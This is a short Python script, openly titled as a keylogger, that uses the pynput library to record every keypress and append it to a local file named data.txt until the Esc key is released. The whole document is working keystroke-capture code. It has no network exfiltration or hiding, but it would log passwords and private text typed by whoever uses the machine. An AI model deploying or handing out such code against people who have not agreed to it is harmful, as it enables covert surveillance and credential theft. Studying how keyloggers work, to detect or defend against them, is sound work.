## Author: InferiorAK
## Keylogger in Python

from pynput.keyboard import (
    Key,
    Listener
)

def collect_data(key):
    # print(str(key))
    with open("data.txt", "a") as f:
        try:
            data = str(key).replace("'", "")
            f.write(data + " ")
        except Exception as err:
            print(err)

def release_process(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    kan_petey_shono = Listener(on_press=collect_data, on_release=release_process)
    # kan_petey_shono = Listener(on_press=collect_data)
    kan_petey_shono.start()
    kan_petey_shono.join()    # if i use this then the process ned on_release to be stopped. but this method is better.
    # input()     # if i use input() then i can terminate the process with keyboard interrupt